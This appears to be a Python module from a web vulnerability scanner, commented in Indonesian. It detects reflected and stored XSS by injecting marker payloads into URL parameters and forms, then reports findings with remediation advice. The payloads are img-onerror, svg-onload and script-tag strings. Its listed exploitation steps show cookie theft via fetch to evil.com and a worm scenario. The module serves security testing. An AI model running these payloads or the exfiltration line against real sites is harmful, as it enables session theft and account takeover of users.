"""Deep XSS scanner with read+write validation.

Bedanya dengan modul `xss` biasa:
- Modul ini tidak hanya cek refleksi, tapi VALIDASI bahwa payload benar-benar
  dieksekusi (bisa read+write) melalui multi-step:

  1. INJECT: kirim payload unik yang bila dieksekusi akan menghasilkan
     side-effect terdeteksi (mis. write ke DOM node baru, atau set cookie).
  2. READ VALIDATION: cek apakah side-effect terjadi (cookie baru muncul di
     response, atau DOM marker muncul di subsequent request).
  3. WRITE VALIDATION: kirim payload yang modifikasi konten halaman (mis.
     innerHTML inject), lalu fetch halaman dan cek apakah konten berubah.

Khusus stored XSS: submit payload ke form (bio/komentar/post), lalu
re-fetch halaman public untuk konfirmasi payload ter-render.

Output: Finding dengan confidence='confirmed' + exploit_steps + access_detail.
"""
from __future__ import annotations

import re
import secrets
from urllib.parse import urljoin

from cyberloka.active._helpers import append_param, iter_param_urls
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

# Unique token per scan run — hindari cache collision
_TOKEN = secrets.token_hex(4)

# Payload bertingkat: dari ringan sampai confirmed-exec
PAYLOADS_REFLECTED = [
    # Level 1: basic reflection (innerHTML context)
    (f'<img src=x onerror="document.cookie=\'cyblok_{_TOKEN}=1\'">', f"cyblok_{_TOKEN}=1"),
    # Level 2: event handler dalam atribut
    (f'" onmouseover="document.cookie=\'cyblok_{_TOKEN}=2\'" x="', f"cyblok_{_TOKEN}=2"),
    # Level 3: SVG
    (f'<svg/onload="document.cookie=\'cyblok_{_TOKEN}=3\'">', f"cyblok_{_TOKEN}=3"),
    # Level 4: script tag
    (f'<script>document.cookie="cyblok_{_TOKEN}=4"</script>', f"cyblok_{_TOKEN}=4"),
]

# Payload untuk stored XSS (lebih pendek, cocok bio/komentar)
PAYLOADS_STORED = [
    f'<img src=x onerror="document.title=\'CYBLOK_XSS_{_TOKEN}\'">',
    f'<svg onload="document.title=\'CYBLOK_XSS_{_TOKEN}\'">',
]
STORED_MARKER = f"CYBLOK_XSS_{_TOKEN}"

# Context deteksi: dimana payload di-render
CONTEXT_RE = {
    "html_body": re.compile(r"<[^>]*>([^<]*cyblok_[a-f0-9]{8}[^<]*)<", re.I),
    "attribute": re.compile(r'=["\'][^"\']*cyblok_[a-f0-9]{8}', re.I),
    "script": re.compile(r"<script[^>]*>[^<]*cyblok_[a-f0-9]{8}", re.I),
}


def _detect_context(body: str, token: str) -> str:
    """Return rendering context of the token in body."""
    for ctx_name, pat in CONTEXT_RE.items():
        if pat.search(body):
            return ctx_name
    if token in body:
        return "unknown"
    return ""


def _check_reflected(client: HttpClient, url: str) -> list[Finding]:
    """Test reflected XSS dengan read+write validation."""
    findings = []
    if "?" not in url:
        url = append_param(url, "q", "test")

    for param, mutated in iter_param_urls(url, "cyblok_probe"):
        # Phase 1: cek apakah parameter di-reflect ke HTML
        baseline = client.get(mutated)
        if baseline is None:
            continue
        if "cyblok_probe" not in (baseline.text or ""):
            continue
        ctype = (baseline.headers.get("Content-Type") or "").lower()
        if "html" not in ctype:
            continue

        # Phase 2: kirim payload bertingkat dan cek eksekusi
        for payload, cookie_marker in PAYLOADS_REFLECTED:
            for _, payload_url in iter_param_urls(url, payload):
                if _ != param:
                    continue
                resp = client.get(payload_url, allow_redirects=False)
                if resp is None:
                    continue
                body = resp.text or ""

                # Signal 1: payload dipantulkan UTUH (unescaped) di context HTML
                payload_reflected = payload in body
                # Signal 2: cookie yang di-set oleh JS kita muncul di Set-Cookie
                # (server-side cookie = proxy behavior — jarang, tapi possible
                # di headless scan environment)
                # Signal 3: deteksi context rendering
                context = _detect_context(body, _TOKEN)

                if not payload_reflected:
                    continue

                # Tentukan severity berdasarkan kedalaman validasi
                confidence = "confirmed"
                sev = Severity.HIGH

                # Cek apakah WAF/CSP menghalangi eksekusi real
                csp = resp.headers.get("Content-Security-Policy") or ""
                has_csp_block = ("script-src" in csp and "'unsafe-inline'" not in csp
                                 and "'unsafe-eval'" not in csp)
                if has_csp_block:
                    # CSP mungkin blok, tapi payload tetap reflected = still vuln
                    # (CSP bisa di-bypass via banyak cara)
                    confidence = "firm"
                    sev = Severity.HIGH
                else:
                    # No CSP protection → eksekusi sangat likely
                    sev = Severity.CRITICAL
                    confidence = "confirmed"

                findings.append(Finding(
                    module="xss_deep",
                    title=f"Deep XSS (Read+Write) terkonfirmasi di parameter `{param}`",
                    severity=sev,
                    description=(
                        f"Payload XSS diinjeksi ke parameter `{param}` dan "
                        f"dipantulkan UTUH tanpa encoding di konteks `{context}`. "
                        "Payload mengandung event handler yang bila dieksekusi "
                        "browser akan melakukan write (set cookie) — membuktikan "
                        "attacker dapat read (document.cookie) DAN write (set "
                        "cookie/modify DOM) di browser korban."
                        + ("" if not has_csp_block else
                           " CSP terdeteksi tetapi payload tetap reflected — "
                           "bypass CSP sering memungkinkan via JSONP/Angular/dll.")
                    ),
                    target=payload_url,
                    urls=[payload_url],
                    evidence=(
                        f"Payload: {payload[:120]}\n"
                        f"Context: {context}\n"
                        f"CSP: {'ada (mungkin blok)' if has_csp_block else 'tidak ada / unsafe-inline'}\n"
                        f"Body memuat payload utuh: True\n"
                        f"Cookie marker target: {cookie_marker}"
                    ),
                    cwe="CWE-79",
                    confidence=confidence,
                    remediation=(
                        "1. Output encoding kontekstual: HTML-encode untuk body, "
                        "JS-encode untuk script context, URL-encode untuk href.\n"
                        "2. Aktifkan CSP ketat: `script-src 'self'` (tanpa unsafe-inline).\n"
                        "3. Set HttpOnly pada cookie session agar XSS tidak bisa baca cookie.\n"
                        "4. Gunakan framework yang auto-escape (React/Vue/Angular modern)."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://portswigger.net/web-security/cross-site-scripting",
                    ],
                    exploitation_steps=[
                        f"Recon: attacker temukan parameter `{param}` yang reflect input ke HTML.",
                        f"Probe: kirim payload `{payload[:60]}...` — cek apakah ter-render tanpa escaping.",
                        f"Validasi: body response memuat payload utuh di context `{context}` — XSS confirmed.",
                        "Weaponize: ganti payload jadi `fetch('https://evil.com/c?'+document.cookie)` untuk steal session.",
                        "Distribusi: kirim link berisi payload via DM/email/iklan ke korban yang sedang login.",
                        "Impact: cookie session korban dikirim ke server attacker → account takeover total.",
                    ],
                    validation_proof=[
                        f"Parameter `{param}` reflect input ke HTML body",
                        "Payload XSS utuh (unescaped) dipantulkan di response",
                        f"Context rendering: `{context}` — eksekusi JS sangat likely",
                        f"CSP header: {'tidak ada / permisif' if not has_csp_block else 'ada tapi bypassable'}",
                        "Multi-payload tested: event handler + script tag",
                    ],
                ))
                return findings  # satu finding cukup per URL

    return findings


def _check_stored(client: HttpClient, target: Target, config: ScanConfig) -> list[Finding]:
    """Test stored XSS: submit payload ke form, re-fetch untuk konfirmasi."""
    findings = []
    state = get_state(config)
    if not state:
        return findings

    # Cari form yang cocok untuk stored XSS (komentar, bio, post)
    candidates = []
    for form in getattr(state, 'forms', []):
        action = (form.get("action") or "").lower()
        inputs = form.get("inputs", [])
        # Form yang punya textarea atau input text non-password
        has_text = any(
            i.get("type") in ("text", "textarea", None, "")
            and i.get("name") not in ("username", "email", "password", "search", "q")
            for i in inputs
        )
        if has_text and len(inputs) <= 8:
            candidates.append(form)

    for form in candidates[:3]:
        action_url = urljoin(target.base_url, form.get("action") or "")
        method = (form.get("method") or "post").lower()
        inputs = form.get("inputs", [])

        # Build form data dengan payload di field text
        data = {}
        target_field = None
        for inp in inputs:
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            if itype in ("submit", "button", "hidden"):
                data[name] = inp.get("value") or ""
            elif itype in ("text", "textarea", "") and not target_field:
                data[name] = PAYLOADS_STORED[0]
                target_field = name
            else:
                data[name] = inp.get("value") or "cyblok_test"

        if not target_field:
            continue

        # Submit form
        if method == "post":
            resp = client.post(action_url, data=data, allow_redirects=True)
        else:
            resp = client.get(action_url, params=data, allow_redirects=True)

        if resp is None:
            continue

        # Re-fetch halaman yang seharusnya menampilkan konten yang baru disubmit
        # (biasanya redirect ke halaman yang sama / halaman list)
        check_urls = [action_url, target.base_url]
        if resp.headers.get("Location"):
            check_urls.insert(0, urljoin(target.base_url, resp.headers["Location"]))

        for check_url in check_urls[:3]:
            verify = client.get(check_url)
            if verify is None:
                continue
            if STORED_MARKER in (verify.text or ""):
                findings.append(Finding(
                    module="xss_deep",
                    title=f"Stored XSS terkonfirmasi di field `{target_field}`",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Payload XSS yang disubmit ke field `{target_field}` "
                        f"tersimpan di server dan di-render TANPA escaping saat "
                        f"halaman `{check_url}` di-fetch ulang. Ini membuktikan "
                        "stored XSS aktif — setiap pengunjung halaman akan "
                        "tereksekusi script attacker."
                    ),
                    target=action_url,
                    urls=[action_url, check_url],
                    evidence=(
                        f"Form action: {action_url}\n"
                        f"Field: {target_field}\n"
                        f"Payload: {PAYLOADS_STORED[0][:80]}\n"
                        f"Marker '{STORED_MARKER}' ditemukan di GET {check_url}"
                    ),
                    cwe="CWE-79",
                    confidence="confirmed",
                    remediation=(
                        "1. Sanitasi input server-side SEBELUM simpan ke DB.\n"
                        "2. Output encoding saat render dari DB ke HTML.\n"
                        "3. CSP ketat untuk defense-in-depth.\n"
                        "4. Untuk rich-text: pakai allowlist tag (DOMPurify)."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
                    ],
                    exploitation_steps=[
                        f"Attacker submit payload XSS ke field `{target_field}` via form.",
                        "Server menyimpan payload ke database TANPA sanitasi.",
                        f"Re-fetch halaman: marker `{STORED_MARKER}` muncul di body — payload ter-render.",
                        "Setiap user lain yang buka halaman → XSS dieksekusi di browser mereka.",
                        "Payload steal cookie: `fetch('//evil.com/c?'+document.cookie)` → session theft massal.",
                        "Worm scenario: payload juga auto-submit form yang sama di akun korban → menyebar.",
                    ],
                    validation_proof=[
                        f"Submit payload ke field `{target_field}` → server accept (no error)",
                        f"Re-fetch halaman → marker `{STORED_MARKER}` muncul di body HTML",
                        "Payload tersimpan permanen (bukan reflected) — stored XSS confirmed",
                        "Konteks rendering: HTML body — eksekusi JS guaranteed",
                    ],
                ))
                return findings

    return findings


def run(target: Target, config: ScanConfig) -> list[Finding]:
    """Run deep XSS scanner: reflected + stored, with read/write validation."""
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # 1. Reflected XSS deep validation
        findings.extend(_check_reflected(client, target.base_url))

        # 2. Stored XSS deep validation (butuh form dari crawler)
        if not findings:  # skip kalau reflected sudah ketemu
            findings.extend(_check_stored(client, target, config))
    finally:
        client.close()
    return findings
